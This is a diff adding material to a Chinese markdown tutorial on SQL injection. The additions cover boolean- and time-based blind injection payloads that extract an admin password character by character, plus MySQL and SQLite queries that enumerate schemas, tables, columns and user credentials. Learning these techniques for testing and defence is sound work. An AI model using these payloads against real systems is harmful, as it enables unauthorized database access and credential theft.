@@ -141,7 +141,7 @@ SELECT id, name, pass FROM users WHERE name='$name' and pass='$pass'";
 
 报错注入是利用SQL语句执行报错且报错信息回显于页面中
 
-#### xpath报错
+#### XPATH syntax 报错
 
 在mysql（大于5.1版本）中添加了对XML文档进行查询和修改的函数：
 - updatexml: 对 XML 数据进行修改。它接收一个原始 XML 字符串，一个 XPath 表达式以定位需要修改的部分，以及一个新的 XML 片段来替换旧的部分
@@ -180,13 +180,81 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema
 
 ### 盲注
 
+盲注相较于上述注入种类，无法获得回显信息，页面无任何信息返回，或者页面只有2种显示状态的区别，观察应用程序的响应时长或页面区别来确定注入是否成功，以及探测数据库中的数据。
+
+盲注的两种主要形式是：
+- 基于布尔的盲注（Boolean-based Blind Injection）: 基于布尔条件的判断来获取有关数据库内容的信息，尝试不同的条件并根据应用程序的响应来验证其正确性。
+```sql
+?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97
+?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public') > 10
+?id=1 AND LENGTH((SELECT database())) = 6
+```
+- 基于时间的盲注（Time-based Blind Injection）: 使用延时函数或计算耗时操作，以观察应用程序对恶意查询的处理时间。通过观察响应时间的变化，攻击者可以逐渐推断数据库中的数据。
+```sql
+id=1; IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), NULL)
+-- time-consuming operation (BENCHMARK) that calculates the MD5 hash of the string 'a' 10,000,000 times. 
+id=1; IF((SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1))) = 97, BENCHMARK(10000000, MD5('a')), NULL) 
+```
+
+盲注需要搭配自动化的工具不断调整输入探测数据，可以使用`Burp Suite`或者`SQLMap`
+
 ## 获取表结构等信息
 
 整理获取特定信息SQL语句，主要针对`MySQL`和`SQLite`2种类型
 
 ### MySQL
 
+`information_schema`是mysql自带的一个数据库，包含了各种原数据，可以获取以下信息
+
+获取所有databases
+```sql
+select group_concat(schema_name) from information_schema.schemata;
+
+show databases;
+```
+
+获取当前database
+```sql
+select database()
+```
+
+获取当前数据库的所有表tables
+```sql
+select group_concat(table_name) from information_schema.tables where 
+table_schema = database()
+```
+
+获取某个表的所有columns
+```sql
+select group_concat(column_name) from information_schema.columns where 
+table_schema = database() and table_name = 'users'
+```
+
+获取某个表中的数据
+```sql
+select group_concat(id,':',username,':',password) from users
+```
+
 ### SQLite
+
+数据库结构
+```sql
+SELECT sql FROM sqlite_schema
+-- if sqlite_version > 3.33.0
+SELECT sql FROM sqlite_master
+```
+
+表名
+```sql
+SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+```
+
+列名
+```sql
+SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
+```
+
+详细可以[参看](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
 
 ## 绕过
 
